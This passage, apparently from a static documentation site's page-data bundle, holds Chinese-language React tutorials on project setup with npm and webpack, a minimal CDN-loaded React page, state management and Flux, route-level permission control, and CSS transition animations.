项目初始化",charIndex:223},{level:3,title:"安装指定npm包",slug:"安装指定npm包",normalizedTitle:"安装指定npm包",charIndex:1515},{level:3,title:"目录结构",slug:"目录结构",normalizedTitle:"目录结构",charIndex:65}],headersStr:"从零搭建开发环境基本步骤 建立项目文件夹 npm init 项目初始化 安装指定npm包 目录结构",content:'# React项目环境搭建\n\n当我们采用React进行SPA项目开发的时候，起初需要做开发前的准备工作，主要工作搭建开发环境，建立目录结构，初始化当前项目，安装React开发依赖。\n\n搭建React项目环境有两种方式：\n\n 1. 从零搭建开发环境\n\n * 通过create-react-app 命令行工具用来搭建开发环境\n\n\n# 从零搭建开发环境基本步骤\n\n\n# 建立项目文件夹\n\n$ mkdir 项目目录名称\n$ cd 项目目录名称\n\n\n\n# npm init 项目初始化\n\n创建一个package.json文件，这是一个标准的npm说明文件，里面蕴含了丰富的信息，包括当前项目的依赖模块，自定义的脚本任务等等。在终端中使用npm init命令可以自动创建这个package.json文件\n\n$ npm init\n\nThis utility will walk you through creating a package.json file.\nIt only covers the most common items, and tries to guess sensible defaults.\n\nSee `npm help json` for definitive documentation on these fields\nand exactly what they do.\n\nUse `npm install <pkg> --save` afterwards to install a package and\nsave it as a dependency in the package.json file.\n\nPress ^C at any time to quit.\nname: (react-test)\n...\nAbout to write to /Users/houningzhou/Web/react-o2o/package.json:\n{\n  "name": "react-test",\n  "version": "1.0.0",\n  "description": "react项目练习",\n  "main": "index.jsx.js",\n  "directories": {\n    "doc": "docs"\n  },\n  "scripts": {\n    "test": "echo \\"Error: no test specified\\" && exit 1"\n  },\n  "author": "hnz",\n  "license": "ISC"\n}\nIs this ok? (yes)\n\n\n最终会在项目目录中生成package.json文件。\n\n我们还需要调整 package.json 文件，以便确保我们安装包是私有的(private)，并且移除 main 入口。这可以防止意外发布你的代码。\n\npackage.json\n\n{\n  "name": "react-test",\n  "version": "1.0.0",\n  "description": "react项目练习",\n+ "private": true,\n- "main": "index.js",\n  "directories": {\n    "doc": "docs"\n  },\n  "scripts": {\n    "test": "echo \\"Error: no test specified\\" && exit 1"\n  },\n  "author": "hnz",\n  "license": "ISC"\n}\n\n\n\n# 安装指定npm包\n\n安装webpack、webpack-dev-server开发依赖\n\n$ npm install webpack webpack-dev-server --save-dev\n\n\n安装react、react-dom到生产依赖\n\n$ npm install react react-dom --save\n\n\n安装完成之后，查看package.json可看到多了devDependencies和dependencies两项，根目录也多了一个node_modules文件夹。\n\n\n# 目录结构\n\n/\n ├── dist/                          # 构建后自动生成\n │\n ├── src/                           # 项目开发目录\n │      ├── components/             # 组件\n │      ├── pages/                  # 页面\n │      └── main.js                 # 项目入口\n │\n ├── config/                        # 工程配置\n │      │\n │      ├── webpack.development.config.js # webpack开发环境配置文件\n │      │\n │      └── webpack.production.config.js  # webpack生产环境配置文件\n │\n ├── test/                          # 测试代码\n │\n ├── docs/                          # 项目文档\n │\n ├── static/                        # 库文件等，不会被webpack的loader处理,手动管理\n │      │\n │      ├── favicon.ico             # 站标\n │      │\n │      └── index.html              # 项目入口\n │\n ├── node_modules/                  # 自动生成 包含生产依赖及开发依赖\n │\n ├── package.json                   # 项目配置文件\n │\n └── README.md                      # 项目说明\n',normalizedContent:'# react项目环境搭建\n\n当我们采用react进行spa项目开发的时候，起初需要做开发前的准备工作，主要工作搭建开发环境，建立目录结构，初始化当前项目，安装react开发依赖。\n\n搭建react项目环境有两种方式：\n\n 1. 从零搭建开发环境\n\n * 通过create-react-app 命令行工具用来搭建开发环境\n\n\n# 从零搭建开发环境基本步骤\n\n\n# 建立项目文件夹\n\n$ mkdir 项目目录名称\n$ cd 项目目录名称\n\n\n\n# npm init 项目初始化\n\n创建一个package.json文件，这是一个标准的npm说明文件，里面蕴含了丰富的信息，包括当前项目的依赖模块，自定义的脚本任务等等。在终端中使用npm init命令可以自动创建这个package.json文件\n\n$ npm init\n\nthis utility will walk you through creating a package.json file.\nit only covers the most common items, and tries to guess sensible defaults.\n\nsee `npm help json` for definitive documentation on these fields\nand exactly what they do.\n\nuse `npm install <pkg> --save` afterwards to install a package and\nsave it as a dependency in the package.json file.\n\npress ^c at any time to quit.\nname: (react-test)\n...\nabout to write to /users/houningzhou/web/react-o2o/package.json:\n{\n  "name": "react-test",\n  "version": "1.0.0",\n  "description": "react项目练习",\n  "main": "index.jsx.js",\n  "directories": {\n    "doc": "docs"\n  },\n  "scripts": {\n    "test": "echo \\"error: no test specified\\" && exit 1"\n  },\n  "author": "hnz",\n  "license": "isc"\n}\nis this ok? (yes)\n\n\n最终会在项目目录中生成package.json文件。\n\n我们还需要调整 package.json 文件，以便确保我们安装包是私有的(private)，并且移除 main 入口。这可以防止意外发布你的代码。\n\npackage.json\n\n{\n  "name": "react-test",\n  "version": "1.0.0",\n  "description": "react项目练习",\n+ "private": true,\n- "main": "index.js",\n  "directories": {\n    "doc": "docs"\n  },\n  "scripts": {\n    "test": "echo \\"error: no test specified\\" && exit 1"\n  },\n  "author": "hnz",\n  "license": "isc"\n}\n\n\n\n# 安装指定npm包\n\n安装webpack、webpack-dev-server开发依赖\n\n$ npm install webpack webpack-dev-server --save-dev\n\n\n安装react、react-dom到生产依赖\n\n$ npm install react react-dom --save\n\n\n安装完成之后，查看package.json可看到多了devdependencies和dependencies两项，根目录也多了一个node_modules文件夹。\n\n\n# 目录结构\n\n/\n ├── dist/                          # 构建后自动生成\n │\n ├── src/                           # 项目开发目录\n │      ├── components/             # 组件\n │      ├── pages/                  # 页面\n │      └── main.js                 # 项目入口\n │\n ├── config/                        # 工程配置\n │      │\n │      ├── webpack.development.config.js # webpack开发环境配置文件\n │      │\n │      └── webpack.production.config.js  # webpack生产环境配置文件\n │\n ├── test/                          # 测试代码\n │\n ├── docs/                          # 项目文档\n │\n ├── static/                        # 库文件等，不会被webpack的loader处理,手动管理\n │      │\n │      ├── favicon.ico             # 站标\n │      │\n │      └── index.html              # 项目入口\n │\n ├── node_modules/                  # 自动生成 包含生产依赖及开发依赖\n │\n ├── package.json                   # 项目配置文件\n │\n └── readme.md                      # 项目说明\n',charsets:{cjk:!0}},{title:"一分钟上手React",frontmatter:{},regularPath:"/React/React%E4%BB%8B%E7%BB%8D/%E4%B8%80%E5%88%86%E9%92%9F%E4%B8%8A%E6%89%8BReact.html",relativePath:"React/React介绍/一分钟上手React.md",key:"v-59b39c69",path:"/React/React%E4%BB%8B%E7%BB%8D/%E4%B8%80%E5%88%86%E9%92%9F%E4%B8%8A%E6%89%8BReact.html",headers:[{level:3,title:"步骤 1： 添加一个 DOM 容器到 HTML",slug:"步骤-1-添加一个-dom-容器到-html",normalizedTitle:"步骤 1： 添加一个 dom 容器到 html",charIndex:17},{level:3,title:"步骤 2：引入依赖库文件",slug:"步骤-2-引入依赖库文件",normalizedTitle:"步骤 2：引入依赖库文件",charIndex:307},{level:3,title:"步骤 3：创建一个 React 组件",slug:"步骤-3-创建一个-react-组件",normalizedTitle:"步骤 3：创建一个 react 组件",charIndex:668},{level:3,title:"就是这么简单！",slug:"就是这么简单",normalizedTitle:"就是这么简单！",charIndex:1243}],headersStr:"步骤 1： 添加一个 DOM 容器到 HTML 步骤 2：引入依赖库文件 步骤 3：创建一个 React 组件 就是这么简单！",content:'# 一分钟上手React\n\n\n# 步骤 1： 添加一个 DOM 容器到 HTML\n\n首先，利用你熟悉编辑器(Vscode等)创建一个 HTML 页面。添加一个空的 <div> 标签作为标记你想要用 React 显示内容的位置。例如：\n\n\x3c!-- 其他HTML代码 --\x3e\n<body>\n    <div id="app"></div>\n</body>\n\x3c!-- 其他HTML代码 --\x3e\n\n\n> 你可以像这样在 <body> 标签内的任意位置放置一个“容器” <div>。根据需要，你可以在一个页面上放置多个独立的 DOM 容器。它们通常是空标签 —— React 会替换 DOM 容器内的任何已有内容。\n\n\n# 步骤 2：引入依赖库文件\n\n接下来，在 </body> 结束标签之前，向 HTML 页面中添加2个 <script> 标签：\n\n\x3c!-- 其他HTML代码 --\x3e\n<body>\n    <div id="app"></div>\n\n    \x3c!-- 引入react.js与react-dom.js库文件 --\x3e\n    <script src="https://unpkg.com/react@16/umd/react.development.js" crossorigin><\/script>\n    <script src="https://unpkg.com/react-dom@16/umd/react-dom.development.js" crossorigin><\/script>\n\n</body>\n\n\n\n# 步骤 3：创建一个 React 组件\n\n在 HTML 页面文件引入依赖库文件 <script> 后，在 </body> 结束标签之前，我们可以添加一个<script> ，加入代码。\n\n\x3c!-- 其他HTML代码 --\x3e\n<body>\n    <div id="app"></div>\n\n    \x3c!-- 引入react.js与react-dom.js库文件 --\x3e\n    <script src="https://unpkg.com/react@16/umd/react.development.js" crossorigin><\/script>\n    <script src="https://unpkg.com/react-dom@16/umd/react-dom.development.js" crossorigin><\/script>\n    <script>\n    //1. 创建一个React元素\n    var hello = React.createElement(\'h2\',null,\'hello React!\')\n    //2. 将该元素渲染至页面\n    ReactDOM.render(hello,document.querySelector("#app"))\n    <\/script>\n</body>\n\n\n\n# 就是这么简单！\n\n没有第四步了。你刚刚已经将第一个 React 组件添加到你的网站中。',normalizedContent:'# 一分钟上手react\n\n\n# 步骤 1： 添加一个 dom 容器到 html\n\n首先，利用你熟悉编辑器(vscode等)创建一个 html 页面。添加一个空的 <div> 标签作为标记你想要用 react 显示内容的位置。例如：\n\n\x3c!-- 其他html代码 --\x3e\n<body>\n    <div id="app"></div>\n</body>\n\x3c!-- 其他html代码 --\x3e\n\n\n> 你可以像这样在 <body> 标签内的任意位置放置一个“容器” <div>。根据需要，你可以在一个页面上放置多个独立的 dom 容器。它们通常是空标签 —— react 会替换 dom 容器内的任何已有内容。\n\n\n# 步骤 2：引入依赖库文件\n\n接下来，在 </body> 结束标签之前，向 html 页面中添加2个 <script> 标签：\n\n\x3c!-- 其他html代码 --\x3e\n<body>\n    <div id="app"></div>\n\n    \x3c!-- 引入react.js与react-dom.js库文件 --\x3e\n    <script src="https://unpkg.com/react@16/umd/react.development.js" crossorigin><\/script>\n    <script src="https://unpkg.com/react-dom@16/umd/react-dom.development.js" crossorigin><\/script>\n\n</body>\n\n\n\n# 步骤 3：创建一个 react 组件\n\n在 html 页面文件引入依赖库文件 <script> 后，在 </body> 结束标签之前，我们可以添加一个<script> ，加入代码。\n\n\x3c!-- 其他html代码 --\x3e\n<body>\n    <div id="app"></div>\n\n    \x3c!-- 引入react.js与react-dom.js库文件 --\x3e\n    <script src="https://unpkg.com/react@16/umd/react.development.js" crossorigin><\/script>\n    <script src="https://unpkg.com/react-dom@16/umd/react-dom.development.js" crossorigin><\/script>\n    <script>\n    //1. 创建一个react元素\n    var hello = react.createelement(\'h2\',null,\'hello react!\')\n    //2. 将该元素渲染至页面\n    reactdom.render(hello,document.queryselector("#app"))\n    <\/script>\n</body>\n\n\n\n# 就是这么简单！\n\n没有第四步了。你刚刚已经将第一个 react 组件添加到你的网站中。',charsets:{cjk:!0}},{title:"状态管理",frontmatter:{},regularPath:"/React/Redux/01-%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86.html",relativePath:"React/Redux/01-状态管理.md",key:"v-9982385c",path:"/React/Redux/01-%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86.html",headers:[{level:2,title:"什么是状态？",slug:"什么是状态",normalizedTitle:"什么是状态？",charIndex:30},{level:3,title:"Domain data",slug:"domain-data",normalizedTitle:"domain data",charIndex:234},{level:3,title:"UI state",slug:"ui-state",normalizedTitle:"ui state",charIndex:248},{level:2,title:"什么是状态管理",slug:"什么是状态管理",normalizedTitle:"什么是状态管理",charIndex:607},{level:2,title:"Flux思想",slug:"flux思想",normalizedTitle:"flux思想",charIndex:848},{level:3,title:"Flux是什么？",slug:"flux是什么",normalizedTitle:"flux是什么？",charIndex:1294},{level:3,title:"主要 Flux 实现",slug:"主要-flux-实现",normalizedTitle:"主要 flux 实现",charIndex:1672}],headersStr:"什么是状态？ Domain data UI state 什么是状态管理 Flux思想 Flux是什么？ 主要 Flux 实现",content:"# 状态管理\n\n> 软件工程的本质即是管理复杂度。\n\n\n# 什么是状态？\n\n> 所谓状态，指的是与视图对应的数据，跟展示无关的东西就不算状态。\n\n随着 JavaScript 单页应用开发日趋复杂，JavaScript 需要管理比任何时候都要多的 state （状态）。 这些 state 可能包括服务器响应、缓存数据、本地生成尚未持久化到服务器的数据，也包括 UI 状态，如激活的路由，被选中的标签，是否显示加载动效或者分页器等等。\n\n状态，我们可以将其分为两种类型：Domain data 和 UI state。\n\n\n# Domain data\n\nDomain data非常好理解，他们直接来源于服务端对领域模型的抽象，比如user、product。它们可能被应用的多个地方用到，比如当前user包含的权限信息所有涉及鉴权的地方都需要。\n\n通常，前端对Domain data最大的管理需求是和服务端保持同步，不会有频繁和复杂的变更——如果有的话请考虑合并批处理和转移复杂度到服务端。\n\n\n# UI state\n\n决定当前UI如何展示的状态，比如一个弹窗的开闭，下拉菜单是否打开。\n\n和Domain data的简单、稳定不同，UI state是多变，不稳定的——不同的页面有不同、甚至相似但又细微不同的展现和交互。\n\nUI state多变、不稳定，但它仍然是需要被复用的。小到弹窗的开闭，大到表单的管理。\n\n\n# 什么是状态管理\n\n> 状态决定视图（state => view） 。\n\n现在的前端开发中，对于状态的管理是重中之重。\n\n一个较大的项目中，会涉及到很多数据，有的是纯前端的(UI state)，也有来自后端(Domain data)的，随着 View 层交互行为的驱动，整个项目中的数据需要涉及到大量的数据变更，这种变更会十分复杂，以至于我们无法追踪状态的源头，这个时候，就需要采用一些方案，来管理这些数据状态，所谓的 状态管理，管理的是从视图层事件源到数据变迁的映射过程。\n\n\n# Flux思想\n\n在 Web 应用开发中，AngularJS 扮演了重要角色。然而 AngularJS 数据和视图的双向绑定基于脏检测的机制，在性能上存在短板，任何数据的变更都会重绘整个视图。但是，由状态反应视图、自动更新页面的思想是先进的，为了解决性能上的问题，Facebook 的工程师们提出了 Virtual DOM 的思想。将 DOM 放到内存中，state 发生变化的时候，根据 state 生成新的 Virtual DOM，再将它和之前的 Virtual DOM 通过一个 diff 算法进行对比，将被改变的内容在浏览器中渲染，避免了 JS 引擎频繁调用渲染引擎的 DOM 操作接口，充分利用了 JS 引擎的性能。有了 Virtual DOM 的支持，React 也诞生了。\n\n有了 React，state => view的思想也就有了很好的实践，但反过来呢，怎么在 view 中合理地修改 state 成为了一个新的问题，为此，Facebook 提出了 Flux 思想。\n\n\n# Flux是什么？\n\n> Flux是一种架构思想，用于构建Web应用时，规范数据在应用中的流动。\n\n> Flux 的核心思想就是数据和逻辑永远单向流动。\n\nFlux架构思想是单向数据流，将之前放到组件中各种修改数据层代码都收归一处，统一管理。组件需要修改数据层的话需要去触发预先定义好的指定dispatcher，然后dispatcher将action应用到model上，实现数据层的修改。然后数据层的修改会应用到视图上，形成一个单向数据流。\n\n打个比方，就像图书馆的管理，原来是开放的，所有人都可以随意进出书库借书还书，如果人数不多，这种方式可以减少流程，增加效率，一旦人数变多就势必造成混乱。Flux就如同给这个图书馆加上了一个管理员，所有借书还书的行为都需要委托给管理员去做，管理员会规范对书库的操作行为，也会记录每个人的操作，减少混乱的现象。\n\n\n# 主要 Flux 实现\n\n# Redux\n\n\n\n# MobX\n\n> 简单、可扩展的状态管理\n\nMobX是一个功能强大，上手非常容易的状态管理工具。\n\n类型     地址\n中文文档   https://cn.mobx.js.org/\n\n# Vuex\n\nVue 的状态管理方法 Vuex 就是依照 Flux 的“单向数据流”理念，单向数据流示意图，如下：",normalizedContent:"# 状态管理\n\n> 软件工程的本质即是管理复杂度。\n\n\n# 什么是状态？\n\n> 所谓状态，指的是与视图对应的数据，跟展示无关的东西就不算状态。\n\n随着 javascript 单页应用开发日趋复杂，javascript 需要管理比任何时候都要多的 state （状态）。 这些 state 可能包括服务器响应、缓存数据、本地生成尚未持久化到服务器的数据，也包括 ui 状态，如激活的路由，被选中的标签，是否显示加载动效或者分页器等等。\n\n状态，我们可以将其分为两种类型：domain data 和 ui state。\n\n\n# domain data\n\ndomain data非常好理解，他们直接来源于服务端对领域模型的抽象，比如user、product。它们可能被应用的多个地方用到，比如当前user包含的权限信息所有涉及鉴权的地方都需要。\n\n通常，前端对domain data最大的管理需求是和服务端保持同步，不会有频繁和复杂的变更——如果有的话请考虑合并批处理和转移复杂度到服务端。\n\n\n# ui state\n\n决定当前ui如何展示的状态，比如一个弹窗的开闭，下拉菜单是否打开。\n\n和domain data的简单、稳定不同，ui state是多变，不稳定的——不同的页面有不同、甚至相似但又细微不同的展现和交互。\n\nui state多变、不稳定，但它仍然是需要被复用的。小到弹窗的开闭，大到表单的管理。\n\n\n# 什么是状态管理\n\n> 状态决定视图（state => view） 。\n\n现在的前端开发中，对于状态的管理是重中之重。\n\n一个较大的项目中，会涉及到很多数据，有的是纯前端的(ui state)，也有来自后端(domain data)的，随着 view 层交互行为的驱动，整个项目中的数据需要涉及到大量的数据变更，这种变更会十分复杂，以至于我们无法追踪状态的源头，这个时候，就需要采用一些方案，来管理这些数据状态，所谓的 状态管理，管理的是从视图层事件源到数据变迁的映射过程。\n\n\n# flux思想\n\n在 web 应用开发中，angularjs 扮演了重要角色。然而 angularjs 数据和视图的双向绑定基于脏检测的机制，在性能上存在短板，任何数据的变更都会重绘整个视图。但是，由状态反应视图、自动更新页面的思想是先进的，为了解决性能上的问题，facebook 的工程师们提出了 virtual dom 的思想。将 dom 放到内存中，state 发生变化的时候，根据 state 生成新的 virtual dom，再将它和之前的 virtual dom 通过一个 diff 算法进行对比，将被改变的内容在浏览器中渲染，避免了 js 引擎频繁调用渲染引擎的 dom 操作接口，充分利用了 js 引擎的性能。有了 virtual dom 的支持，react 也诞生了。\n\n有了 react，state => view的思想也就有了很好的实践，但反过来呢，怎么在 view 中合理地修改 state 成为了一个新的问题，为此，facebook 提出了 flux 思想。\n\n\n# flux是什么？\n\n> flux是一种架构思想，用于构建web应用时，规范数据在应用中的流动。\n\n> flux 的核心思想就是数据和逻辑永远单向流动。\n\nflux架构思想是单向数据流，将之前放到组件中各种修改数据层代码都收归一处，统一管理。组件需要修改数据层的话需要去触发预先定义好的指定dispatcher，然后dispatcher将action应用到model上，实现数据层的修改。然后数据层的修改会应用到视图上，形成一个单向数据流。\n\n打个比方，就像图书馆的管理，原来是开放的，所有人都可以随意进出书库借书还书，如果人数不多，这种方式可以减少流程，增加效率，一旦人数变多就势必造成混乱。flux就如同给这个图书馆加上了一个管理员，所有借书还书的行为都需要委托给管理员去做，管理员会规范对书库的操作行为，也会记录每个人的操作，减少混乱的现象。\n\n\n# 主要 flux 实现\n\n# redux\n\n\n\n# mobx\n\n> 简单、可扩展的状态管理\n\nmobx是一个功能强大，上手非常容易的状态管理工具。\n\n类型     地址\n中文文档   https://cn.mobx.js.org/\n\n# vuex\n\nvue 的状态管理方法 vuex 就是依照 flux 的“单向数据流”理念，单向数据流示意图，如下：",charsets:{cjk:!0}},{title:"React权限控制",frontmatter:{},regularPath:"/React/React%E9%A1%B9%E7%9B%AE/02-React%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6.html",relativePath:"React/React项目/02-React权限控制.md",key:"v-5fcd590d",path:"/React/React%E9%A1%B9%E7%9B%AE/02-React%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6.html",headers:[{level:2,title:"页面级别",slug:"页面级别",normalizedTitle:"页面级别",charIndex:45},{level:3,title:"Route再封装实现",slug:"route再封装实现",normalizedTitle:"route再封装实现",charIndex:210},{level:3,title:"高阶组件实现",slug:"高阶组件实现",normalizedTitle:"高阶组件实现",charIndex:695},{level:2,title:"页面元素级别",slug:"页面元素级别",normalizedTitle:"页面元素级别",charIndex:52}],headersStr:"页面级别 Route再封装实现 高阶组件实现 页面元素级别",content:'# React权限控制\n\n权限控制是中后台系统中常见的需求之一。权限控制一般分为两个维度：页面级别 和 页面元素级别。\n\n * 页面级别\n * 页面元素级别\n   * 模块权限-页面区块（组件）是否显示\n   * 元件权限-组件内元素是否显示\n\n\n# 页面级别\n\n在这个方法里面，通过sessionStorage判断是否登录了，如果没有登录，就保存一下当前想要跳转的路由到redux里面。然后跳转到我们登录页。\n\n\n# Route再封装实现\n\nimport React, { Component } from "react";\nimport { Route, Redirect } from "react-router-dom";\n\nclass AuthRoute extends Component {\n    render() {\n        const { component: Component, ...rest } = this.props;\n        const isLogged = sessionStorage.getItem("token") !== null ? true : false;\n        return <Route {...rest} render={props => {\n            return isLogged ? <Component {...props} /> : <Redirect to="/" />;\n        }} />\n    }\n}\n\nexport default AuthRoute;\n\n\n\n# 高阶组件实现\n\nimport React, { Component } from "react";\nimport { Route, Redirect } from "react-router-dom";\nconst AuthRoute = (WrappedComponent) => {\n    return class extends Component {\n        render() {\n            let { component: Component, ...rest } = this.props;\n            let isLogged = sessionStorage.getItem("token") !== null ? true : false;\n            return <WrappedComponent {...rest} render={props => {\n                return isLogged ? <Component {...props} /> : <Redirect to="/" />;\n            }} />\n        }\n    }\n}\nexport default AuthRoute(Route);\n\n\n\n# 页面元素级别\n\n后端会将用户权限数据同步注入到VM模板中或者前端发送异步请求取到权限数据，数据消费场景一般都散落在代码的角角落落。\n\n// 伪代码\nrender(){\n    return {window.permission?<Component/>:null}\n}\n\nrender(){\n    return <Component>{this.props.permission?<Button>删除</Button>: null}</Component>\n}\n\n\n用这种方式实现的代码，执行上没有问题，也达到了业务的需求。但是随着代码量的递增，代码变得难以维护，特别是新接手的同学，简直是一场噩梦。\n\n * https://yq.aliyun.com/articles/609672?utm_content=m_1000006026\n * https://segmentfault.com/a/1190000008829420?utm_source=tuicool&utm_medium=referral\n * https://segmentfault.com/a/1190000014691570',normalizedContent:'# react权限控制\n\n权限控制是中后台系统中常见的需求之一。权限控制一般分为两个维度：页面级别 和 页面元素级别。\n\n * 页面级别\n * 页面元素级别\n   * 模块权限-页面区块（组件）是否显示\n   * 元件权限-组件内元素是否显示\n\n\n# 页面级别\n\n在这个方法里面，通过sessionstorage判断是否登录了，如果没有登录，就保存一下当前想要跳转的路由到redux里面。然后跳转到我们登录页。\n\n\n# route再封装实现\n\nimport react, { component } from "react";\nimport { route, redirect } from "react-router-dom";\n\nclass authroute extends component {\n    render() {\n        const { component: component, ...rest } = this.props;\n        const islogged = sessionstorage.getitem("token") !== null ? true : false;\n        return <route {...rest} render={props => {\n            return islogged ? <component {...props} /> : <redirect to="/" />;\n        }} />\n    }\n}\n\nexport default authroute;\n\n\n\n# 高阶组件实现\n\nimport react, { component } from "react";\nimport { route, redirect } from "react-router-dom";\nconst authroute = (wrappedcomponent) => {\n    return class extends component {\n        render() {\n            let { component: component, ...rest } = this.props;\n            let islogged = sessionstorage.getitem("token") !== null ? true : false;\n            return <wrappedcomponent {...rest} render={props => {\n                return islogged ? <component {...props} /> : <redirect to="/" />;\n            }} />\n        }\n    }\n}\nexport default authroute(route);\n\n\n\n# 页面元素级别\n\n后端会将用户权限数据同步注入到vm模板中或者前端发送异步请求取到权限数据，数据消费场景一般都散落在代码的角角落落。\n\n// 伪代码\nrender(){\n    return {window.permission?<component/>:null}\n}\n\nrender(){\n    return <component>{this.props.permission?<button>删除</button>: null}</component>\n}\n\n\n用这种方式实现的代码，执行上没有问题，也达到了业务的需求。但是随着代码量的递增，代码变得难以维护，特别是新接手的同学，简直是一场噩梦。\n\n * https://yq.aliyun.com/articles/609672?utm_content=m_1000006026\n * https://segmentfault.com/a/1190000008829420?utm_source=tuicool&utm_medium=referral\n * https://segmentfault.com/a/1190000014691570',charsets:{cjk:!0}},{title:"React动画",frontmatter:{},regularPath:"/React/React%E5%9F%BA%E7%A1%80/12-react%E5%8A%A8%E7%94%BB.html",relativePath:"React/React基础/12-react动画.md",key:"v-42bcf22a",path:"/React/React%E5%9F%BA%E7%A1%80/12-react%E5%8A%A8%E7%94%BB.html",headers:[{level:2,title:"React实现动画方式",slug:"react实现动画方式",normalizedTitle:"react实现动画方式",charIndex:306},{level:3,title:"CSS渐变组",slug:"css渐变组",normalizedTitle:"css渐变组",charIndex:340}],headersStr:"React实现动画方式 CSS渐变组",content:"# React动画\n\n动画就是使用页面局部的快速更新让人们产生动态效果的感觉。\n\n动画可以帮助用户理解页面，增加应用的趣味性和可玩性，提高用户体验。有时候，一个好的加载动画甚至要比优化数据库、减少等待时间要有效得多。\n\nReact 通过 setState 让界面迅速发生变化，但动画的哲学告诉我们，变化要慢，得用一个逐渐变化的过程来过渡，从而帮助用户理解页面。\n\n界面的变化可以分为 DOM 节点(或组件)的增与减以及 DOM 节点(或组件)属性的变化。 其中 React 提供的 TransitionGroup 能够帮助我们便捷地识别出增加或删除的组件，从而让我们能够专注于更加简单的属性变化的动画。\n\n\n# React实现动画方式\n\nReact实现动画有两种方式：\n\n 1. CSS渐变组\n    简化了将CSS动画应用于渐变的过程，在合适的渲染和重绘时间点有策略的添加和移除元素的class。\n 2. 间隔动画\n    以牺牲性能为代价，提供更多的可扩展性和可控性。需要更多次的渲染，但同时也允许为css之外的内容（比如滚动条位置以及canvas绘图）添加动画。\n\n\n# CSS渐变组\n\nReactCSStransitionGroup是在插件类ReactTransitionGroup这个底层API基础上进一步封装的高级API，来简单的实现基本的CSS动画和过渡。\n\n# 安装react-addons-css-transition-group\n\nnpm install react-addons-css-transition-group --save\n\n\n# 引用\n\nimport ReactCSSTransitionGroup from 'react-addons-css-transition-group'; // ES6\nvar ReactCSSTransitionGroup = require('react-addons-css-transition-group'); // ES5 with npm\n\n\n> 浏览器端使用：引入文件 <script src=\"../libs/react-with-addons.min.js\"><\/script>\n\nReactCSSTransitionGroup组件常用属性介绍：\n\n 1. transitionName:关联CSS类，需要自己实现css动画实现的类。如transitionName=\"box\"，那么你需要在css写以下类，分别是进入前后的状态和离开前后的状态\n 2. transitionEnterTimeout 进入动画执行的时间\n 3. transitionLeaveTimeout 离开的动画执行的时间\n\n假设我们有一个需要淡入淡出的需求:\n\n//animate.less\n.box-enter {\n  opacity: 0.01;\n}\n\n.box-enter.box-enter-active {\n  opacity: 1;\n  transition: opacity 500ms ease-in;\n}\n\n.box-leave {\n  opacity: 1;\n}\n\n.box-leave.box-leave-active {\n  opacity: 0.01;\n  transition: opacity 300ms ease-in;\n}\n\n//\nimport ReactCSSTransitionGroup from 'react-addons-css-transition-group';\nimport './animate.less'\nclass Animate extends React.Component{\n\tconstructor(){\n\t\tsuper(...arguments);\n\t\tthis.state = {\n\t\t\tshow:false,\n\t\t\tlists:['海阔天空','在心里从此有个你','霸王别姬']\n\t\t}\n\t}\n\trender(){\n\t\tvar items = this.state.lists.map((item,index)=>{\n\t\t\treturn <div key={index} onClick={this.handleRemove.bind(this,index)}>{item}</div>\n\t\t})\n\t\treturn <div>\n\t\t\t<button onClick={this.handleAdd.bind(this)}>切换</button>\n\t\t\t<ReactCSSTransitionGroup\n\t\t\t\ttransitionName=\"box\"\n\t\t\t\ttransitionEnterTimeout={500}\n\t\t\t\ttransitionLeaveTimeout={300}\n\t\t\t>\n\t\t\t\t{items}\n\t\t\t</ReactCSSTransitionGroup>\n\n\t\t</div>\n\t}\n\thandleAdd() {\n\tvar newLists =this.state.lists.concat(['Enter some text']);\n\t\tthis.setState({lists: newLists});\n\t}\n\thandleRemove(i) {\n\t\tvar newLists = this.state.lists.slice();\n\t\tnewLists.splice(i, 1);\n\t\tthis.setState({lists: newLists});\n\t}\n}\n\n\n这样便轻松地实现了新增元素、删除元素的动画。\n\n需要注意的地方是你要为 ReactCSSTransitionGroup 的子组件提供一个关键key，这个key是为了让React知道你添加了什么以及删除了什么。\n\n> 禁止动画 当你需要禁止动画时只需要设置 transitionEnter={false} 或者 transitionLeave={false}。",normalizedContent:"# react动画\n\n动画就是使用页面局部的快速更新让人们产生动态效果的感觉。\n\n动画可以帮助用户理解页面，增加应用的趣味性和可玩性，提高用户体验。有时候，一个好的加载动画甚至要比优化数据库、减少等待时间要有效得多。\n\nreact 通过 setstate 让界面迅速发生变化，但动画的哲学告诉我们，变化要慢，得用一个逐渐变化的过程来过渡，从而帮助用户理解页面。\n\n界面的变化可以分为 dom 节点(或组件)的增与减以及 dom 节点(或组件)属性的变化。 其中 react 提供的 transitiongroup 能够帮助我们便捷地识别出增加或删除的组件，从而让我们能够专注于更加简单的属性变化的动画。\n\n\n# react实现动画方式\n\nreact实现动画有两种方式：\n\n 1. css渐变组\n    简化了将css动画应用于渐变的过程，在合适的渲染和重绘时间点有策略的添加和移除元素的class。\n 2. 间隔动画\n    以牺牲性能为代价，提供更多的可扩展性和可控性。需要更多次的渲染，但同时也允许为css之外的内容（比如滚动条位置以及canvas绘图）添加动画。\n\n\n# css渐变组\n\nreactcsstransitiongroup是在插件类reacttransitiongroup这个底层api基础上进一步封装的高级api，来简单的实现基本的css动画和过渡。\n\n# 安装react-addons-css-transition-group\n\nnpm install react-addons-css-transition-group --save\n\n\n# 引用\n\nimport reactcsstransitiongroup from 'react-addons-css-transition-group'; // es6\nvar reactcsstransitiongroup = require('react-addons-css-transition-group'); // es5 with npm\n\n\n> 浏览器端使用：引入文件 <script src=\"../libs/react-with-addons.min.js\"><\/script>\n\nreactcsstransitiongroup组件常用属性介绍：\n\n 1. transitionname:关联css类，需要自己实现css动画实现的类。如transitionname=\"box\"，那么你需要在css写以下类，分别是进入前后的状态和离开前后的状态\n 2. transitionentertimeout 进入动画执行的时间\n 3. transitionleavetimeout 离开的动画执行的时间\n\n假设我们有一个需要淡入淡出的需求:\n\n//animate.less\n.box-enter {\n  opacity: 0.01;\n}\n\n.box-enter.box-enter-active {\n  opacity: 1;\n  transition: opacity 500ms ease-in;\n}\n\n.box-leave {\n  opacity: 1;\n}\n\n.box-leave.box-leave-active {\n  opacity: 0.01;\n  transition: opacity 300ms ease-in;\n}\n\n//\nimport reactcsstransitiongroup from 'react-addons-css-transition-group';\nimport './animate.less'\nclass animate extends 